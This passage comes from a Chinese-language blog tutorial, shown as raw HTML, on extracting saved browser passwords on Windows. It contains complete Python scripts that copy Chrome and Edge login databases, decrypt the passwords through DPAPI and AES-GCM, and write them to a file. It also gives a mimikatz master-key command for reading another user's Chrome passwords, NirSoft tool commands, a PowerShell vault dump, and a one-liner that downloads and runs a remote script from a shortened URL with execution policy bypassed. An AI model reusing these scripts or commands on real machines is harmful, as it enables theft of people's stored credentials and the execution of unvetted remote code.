class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="number">0</span>)</span><br><span class="line">            <span class="comment">#密码解析后得到字节码，需要进行解码操作</span></span><br><span class="line">            _info = <span class="string">&#x27;url:%-40s username:%-20s password:%s\n&#x27;</span> %\</span><br><span class="line">                    (row[<span class="number">0</span>][:<span class="number">50</span>],row[<span class="number">1</span>],ret[<span class="number">1</span>].decode())</span><br><span class="line">            <span class="variable language_">self</span>.passwordList.append(_info)</span><br><span class="line">        conn.close()</span><br><span class="line">        os.remove(db_file)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">save_passwords</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;password.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.writelines(<span class="variable language_">self</span>.passwordList)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    Main = ChromePassword()</span><br><span class="line">    Main.get_chrome_db()</span><br><span class="line">    Main.save_passwords()</span><br></pre></td></tr></table></figure><h4 id="B用户解A的chrome密码"><a href="#B用户解A的chrome密码" class="headerlink" title="B用户解A的chrome密码"></a>B用户解A的chrome密码</h4><p>首先我们需要获取到A用户的MasterKey值，就可以解密了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::chrome /in:&quot;C:\Users\ascotbe\Desktop\Login Data&quot; /unprotect /masterkey:831d02bf734632f7aaa7719f5ec593111997c9aeefabe71ac4e4a963de546784662fcec40722a4656870698cff96c348a37d6691</span><br></pre></td></tr></table></figure><p><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/win_pass/4189.86tfvf5c43.jpg" alt="Alt pic"><br>chrome version 80 （80.0.3987.163）版本后<br>利用主密钥使用AES-GCM加密算法加密密码存放Login Data数据库，然后用DPAPI的加密函数CryptProtectData加密主密钥存放在Local State文件。其中Local State文件存放在如下地址（假设windows用户为admin），本质是个json文件，其中一个值os_crypt下的encrypted_key是解密需要用的被加密后的密钥。</p><p>解密流程</p><pre><code>获取local state和Login Data文件位置获取local state中加密的key(base64编码)数据库语句提取Login Data sqllite文件的password_valueDPAPI解密加密keyase-gcm解密password_value</code></pre><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span>  shutil</span><br><span class="line"><span class="keyword">import</span>  sqlite3</span><br><span class="line"><span class="keyword">import</span>  win32crypt</span><br><span class="line"><span class="keyword">import</span> json,base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> (</span><br><span class="line">    Cipher, algorithms, modes</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">APP_DATA_PATH= os.environ[<span class="string">&#x27;LOCALAPPDATA&#x27;</span>]</span><br><span class="line">DB_PATH = <span class="string">r&#x27;Google\Chrome\User Data\Default\Login Data&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NONCE_BYTE_SIZE = <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">cipher, plaintext, nonce</span>):</span><br><span class="line">    cipher.mode = modes.GCM(nonce)</span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line">    ciphertext = encryptor.update(plaintext)</span><br><span class="line">    <span class="keyword">return</span> (cipher, ciphertext, nonce)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher, ciphertext, nonce</span>):</span><br><span class="line">    cipher.mode = modes.GCM(nonce)</span><br><span class="line">    decryptor = cipher.decryptor()</span><br><span class="line">    <span class="keyword">return</span> decryptor.update(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cipher</span>(<span class="params">key</span>):</span><br><span class="line">    cipher = Cipher(</span><br><span class="line">        algorithms.AES(key),</span><br><span class="line">        <span class="literal">None</span>,</span><br><span class="line">        backend=default_backend()</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dpapi_decrypt</span>(<span class="params">encrypted</span>):</span><br><span class="line">    <span class="keyword">import</span> ctypes</span><br><span class="line">    <span class="keyword">import</span> ctypes.wintypes</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">DATA_BLOB</span>(ctypes.Structure):</span><br><span class="line">        _fields_ = [(<span class="string">&#x27;cbData&#x27;</span>, ctypes.wintypes.DWORD),</span><br><span class="line">                    (<span class="string">&#x27;pbData&#x27;</span>, ctypes.POINTER(ctypes.c_char))]</span><br><span class="line"></span><br><span class="line">    p = ctypes.create_string_buffer(encrypted, <span class="built_in">len</span>(encrypted))</span><br><span class="line">    blobin = DATA_BLOB(ctypes.sizeof(p), p)</span><br><span class="line">    blobout = DATA_BLOB()</span><br><span class="line">    retval = ctypes.windll.crypt32.CryptUnprotectData(</span><br><span class="line">        ctypes.byref(blobin), <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="number">0</span>, ctypes.byref(blobout))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> retval:</span><br><span class="line">        <span class="keyword">raise</span> ctypes.WinError()</span><br><span class="line">    result = ctypes.string_at(blobout.pbData, blobout.cbData)</span><br><span class="line">    ctypes.windll.kernel32.LocalFree(blobout.pbData)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unix_decrypt</span>(<span class="params">encrypted</span>):</span><br><span class="line">    <span class="keyword">if</span> sys.platform.startswith(<span class="string">&#x27;linux&#x27;</span>):</span><br><span class="line">        password = <span class="string">&#x27;peanuts&#x27;</span></span><br><span class="line">        iterations = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">    <span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2</span><br><span class="line"></span><br><span class="line">    salt = <span class="string">&#x27;saltysalt&#x27;</span></span><br><span class="line">    iv = <span class="string">&#x27; &#x27;</span> * <span class="number">16</span></span><br><span class="line">    length = <span class="number">16</span></span><br><span class="line">    key = PBKDF2(password, salt, length, iterations)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, IV=iv)</span><br><span class="line">    decrypted = cipher.decrypt(encrypted[<span class="number">3</span>:])</span><br><span class="line">    <span class="keyword">return</span> decrypted[:-<span class="built_in">ord</span>(decrypted[-<span class="number">1</span>])]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key_from_local_state</span>():</span><br><span class="line">    jsn = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(os.environ[<span class="string">&#x27;LOCALAPPDATA&#x27;</span>],</span><br><span class="line">        <span class="string">r&quot;Google\Chrome\User Data\Local State&quot;</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>,mode =<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        jsn = json.loads(<span class="built_in">str</span>(f.readline()))</span><br><span class="line">    <span class="keyword">return</span> jsn[<span class="string">&quot;os_crypt&quot;</span>][<span class="string">&quot;encrypted_key&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_decrypt</span>(<span class="params">encrypted_txt</span>):</span><br><span class="line">    encoded_key = get_key_from_local_state()</span><br><span class="line">    encrypted_key = base64.b64decode(encoded_key.encode())</span><br><span class="line">    encrypted_key = encrypted_key[<span class="number">5</span>:]</span><br><span class="line">    key = dpapi_decrypt(encrypted_key)</span><br><span class="line">    nonce = encrypted_txt[<span class="number">3</span>:<span class="number">15</span>]</span><br><span class="line">    cipher = get_cipher(key)</span><br><span class="line">    <span class="keyword">return</span> decrypt(cipher,encrypted_txt[<span class="number">15</span>:],nonce)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChromePassword</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.passwordList = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_chrome_db</span>(<span class="params">self</span>):</span><br><span class="line">        _full_path = os.path.join(APP_DATA_PATH,DB_PATH)</span><br><span class="line">        _temp_path = os.path.join(APP_DATA_PATH,<span class="string">&#x27;sqlite_file&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(_temp_path):</span><br><span class="line">            os.remove(_temp_path)</span><br><span class="line">        shutil.copyfile(_full_path,_temp_path)</span><br><span class="line">        <span class="variable language_">self</span>.show_password(_temp_path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_password</span>(<span class="params">self,db_file</span>):</span><br><span class="line">        conn = sqlite3.connect(db_file)</span><br><span class="line">        _sql = <span class="string">&#x27;select signon_realm,username_value,password_value from logins&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> conn.execute(_sql):</span><br><span class="line">            <span class="comment"># print(type(row[2]))</span></span><br><span class="line">            host = row[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> host.startswith(<span class="string">&#x27;android&#x27;</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            name = row[<span class="number">1</span>]</span><br><span class="line">            value = <span class="variable language_">self</span>.chrome_decrypt(row[<span class="number">2</span>])<span class="comment">######加密方式改變后的重點位置</span></span><br><span class="line">            <span class="comment">#密码解析后得到字节码，需要进行解码操作</span></span><br><span class="line">            _info = <span class="string">&#x27;url:%-40s username:%-20s password:%s\n&#x27;</span> %(host,name,value)</span><br><span class="line">            <span class="variable language_">self</span>.passwordList.append(_info)</span><br><span class="line">        conn.close()</span><br><span class="line">        os.remove(db_file)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">chrome_decrypt</span>(<span class="params">self,encrypted_txt</span>):</span><br><span class="line">        <span class="keyword">if</span> sys.platform == <span class="string">&#x27;win32&#x27;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> encrypted_txt[:<span class="number">4</span>] == <span class="string">b&#x27;\x01\x00\x00\x00&#x27;</span>:</span><br><span class="line">                    decrypted_txt = dpapi_decrypt(encrypted_txt)</span><br><span class="line">                    <span class="keyword">return</span> decrypted_txt.decode()</span><br><span class="line">                <span class="keyword">elif</span> encrypted_txt[:<span class="number">3</span>] == <span class="string">b&#x27;v10&#x27;</span>:</span><br><span class="line">                    decrypted_txt = aes_decrypt(encrypted_txt)</span><br><span class="line">                    <span class="keyword">return</span> decrypted_txt[:-<span class="number">16</span>].decode()</span><br><span class="line">            <span class="keyword">except</span> WindowsError:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> unix_decrypt(encrypted_txt)</span><br><span class="line">            <span class="keyword">except</span> NotImplementedError:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">save_passwords</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;password.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.writelines(<span class="variable language_">self</span>.passwordList)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    Main = ChromePassword()</span><br><span class="line">    Main.get_chrome_db()</span><br><span class="line">    Main.save_passwords()</span><br></pre></td></tr></table></figure><p>Firefox浏览器数据</p><p>所有的密码保存位置在%APPDATA%\Mozilla\Firefox\Profiles\xxxxxxxx.default(xxxxxxxx为8位随机字母和数字的组合)</p><p>不同版本的Firefox保存记录的文件名称不同，具体区别如下：</p><pre><code>Version大于等于32.0，保存记录的文件为logins.jsonVersion大于等于3.5，小于32.0，保存记录的文件为signons.sqlite</code></pre><p>不同版本的Firefox密钥文件的位置不同，具体区别如下：</p><pre><code>Version小于58.0.2，密钥文件为key3.dbVersion大于等于58.0.2，密钥文件为key4.db</code></pre><p>默认情况下，当前用户的权限可以查看Firefox浏览器中保存的所有密码，为了提高安全性，Firefox浏览器支持为保存的密码添加额外的保护：设置Master Password。<br><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/win_pass/41810.8hg9okkk9g.jpg" alt="Alt pic"></p><p>添加Master Password后，查看保存的密码需要额外输入Master Password。</p><p>解密流程：</p><pre><code>读取密钥文件(key4.db或key3.db)，获得key和iv读取记录文件(logins.json或signons.sqlite)的内容如果未设置Master Password，使用key和iv对记录文件中的加密内容进行3DES-CBC解密。如果设置Master Password，还需要获得明文形式的Master Password，才能进行解密未设置Master Password解密</code></pre><p>WebBrowserPassView：<a href="https://www.nirsoft.net/password_recovery_tools.html">官方下载</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\WebBrowserPassView.exe /LoadPasswordsFirefox 1 /shtml &quot;C:\Users\ascotbe\Desktop\passwords.html&quot;</span><br></pre></td></tr></table></figure><p>还能把谷歌最新版本的秘钥给解密了<br><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/win_pass/41811.9nzkx69guu.jpg" alt="Alt pic"><br>    设置Master Password解密</p><p>firefox_decrypt：<a href="https://github.com/unode/firefox_decrypt/releases/tag/0.7.0">官方下载</a></p><p>解密需要获取到用户设置的Master Password才行，解密工具别使用1.0版本，问题很多<br><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/win_pass/41812.2a4voeot5j.jpg" alt="Alt pic"></p><h4 id="IE-浏览器数据"><a href="#IE-浏览器数据" class="headerlink" title="IE 浏览器数据"></a>IE 浏览器数据</h4><p>首先需要打开浏览器的记住密码功能：工具-&gt;Internet 选项-&gt;内容-&gt;自动完成-&gt;勾选表单上的用户名和密码<br><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/win_pass/41813.6wqip3nct4.jpg" alt="Alt pic"></p><p>远程下载执行（需要开启PS可执行）</p><p>直接使用命令，目前GitHub国内无法访问，推荐使用自己服务器存放脚本或者使用第三方源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://bit.ly/2K75g15&#x27;)&quot;</span><br></pre></td></tr></table></figure><p><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/win_pass/41814.3nresfzv6h.jpg" alt="Alt pic"></p><p>本地执行（需要开启PS可执行）</p><p>直接把PS1文件放到目标机器上，执行就好了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]</span><br><span class="line"><span class="variable">$vault</span> = New-Object Windows.Security.Credentials.PasswordVault</span><br><span class="line"><span class="variable">$vault</span>.RetrieveAll() | % &#123; <span class="variable">$_</span>.RetrievePassword();<span class="variable">$_</span> &#125; | <span class="keyword">select</span> username,resource,password</span><br></pre></td></tr></table></figure><p><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/win_pass/41815.32hr655evu.jpg" alt="Alt pic"></p><p>落地文件执行</p><p>IE PassView：<a href="https://www.nirsoft.net/utils/internet_explorer_password.html">官方下载</a></p><p>直接把文件双击即可看到密码<br><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/win_pass/41816.2vejapj9gb.jpg" alt="Alt pic"></p><p>Edge浏览器数据</p><p>由于微软就套了一层壳，加密方式完全没有修改，值修改了数据保存的路径，所以我们修改上面Chrome的脚本即可获取成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#数据库路径</span><br><span class="line">C:\Users\ascotbe\AppData\Local\Microsoft\Edge\User Data\Default\Login Data</span><br><span class="line">#秘钥路径</span><br><span class="line">C:\Users\ascotbe\AppData\Local\Microsoft\Edge\User Data\Local State</span><br></pre></td></tr></table></figure><p>脚本修改如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span>  shutil</span><br><span class="line"><span class="keyword">import</span>  sqlite3</span><br><span class="line"><span class="keyword">import</span>  win32crypt</span><br><span class="line"><span class="keyword">import</span> json,base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> (</span><br><span class="line">    Cipher, algorithms, modes</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">APP_DATA_PATH= os.environ[<span class="string">&#x27;LOCALAPPDATA&#x27;</span>]</span><br><span class="line">DB_PATH = <span class="string">r&#x27;Microsoft\Edge\User Data\Default\Login Data&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NONCE_BYTE_SIZE = <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">cipher, plaintext, nonce</span>):</span><br><span class="line">    cipher.mode = modes.GCM(nonce)</span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line">    ciphertext = encryptor.update(plaintext)</span><br><span class="line">    <span class="keyword">return</span> (cipher, ciphertext, nonce)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher, ciphertext, nonce</span>):</span><br><span class="line">    cipher.mode = modes.GCM(nonce)</span><br><span class="line">    decryptor = cipher.decryptor()</span><br><span class="line">    <span class="keyword">return</span> decryptor.update(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cipher</span>(<span class="params">key</span>):</span><br><span class="line">    cipher = Cipher(</span><br><span class="line">        algorithms.AES(key),</span><br><span class="line">        <span class="literal">None</span>,</span><br><span class="line">        backend=default_backend()</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dpapi_decrypt</span>(<span class="params">encrypted</span>):</span><br><span class="line">    <span class="keyword">import</span> ctypes</span><br><span class="line">    <span class="keyword">import</span> ctypes.wintypes</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">DATA_BLOB</span>(ctypes.Structure):</span><br><span class="line">        _fields_ = [(<span class="string">&#x27;cbData&#x27;</span>, ctypes.wintypes.DWORD),</span><br><span class="line">                    (<span class="string">&#x27;pbData&#x27;</span>, ctypes.POINTER(ctypes.c_char))]</span><br><span class="line"></span><br><span class="line">    p = ctypes.create_string_buffer(encrypted, <span class="built_in">len</span>(encrypted))</span><br><span class="line">    blobin = DATA_BLOB(ctypes.sizeof(p), p)</span><br><span class="line">    blobout = DATA_BLOB()</span><br><span class="line">    retval = ctypes.windll.crypt32.CryptUnprotectData(</span><br><span class="line">        ctypes.byref(blobin), <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="number">0</span>, ctypes.byref(blobout))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> retval:</span><br><span class="line">        <span class="keyword">raise</span> ctypes.WinError()</span><br><span class="line">    result = ctypes.string_at(blobout.pbData, blobout.cbData)</span><br><span class="line">    ctypes.windll.kernel32.LocalFree(blobout.pbData)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unix_decrypt</span>(<span class="params">encrypted</span>):</span><br><span class="line">    <span class="keyword">if</span> sys.platform.startswith(<span class="string">&#x27;linux&#x27;</span>):</span><br><span class="line">        password = <span class="string">&#x27;peanuts&#x27;</span></span><br><span class="line">        iterations = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">    <span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2</span><br><span class="line"></span><br><span class="line">    salt = <span class="string">&#x27;saltysalt&#x27;</span></span><br><span class="line">    iv = <span class="string">&#x27; &#x27;</span> * <span class="number">16</span></span><br><span class="line">    length = <span class="number">16</span></span><br><span class="line">    key = PBKDF2(password, salt, length, iterations)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, IV=iv)</span><br><span class="line">    decrypted = cipher.decrypt(encrypted[<span class="number">3</span>:])</span><br><span class="line">    <span class="keyword">return</span> decrypted[:-<span class="built_in">ord</span>(decrypted[-<span class="number">1</span>])]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key_from_local_state</span>():</span><br><span class="line">    jsn = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(os.environ[<span class="string">&#x27;LOCALAPPDATA&#x27;</span>],</span><br><span class="line">        <span class="string">r&quot;Microsoft\Edge\User Data\Local State&quot;</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>,mode =<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        jsn = json.loads(<span 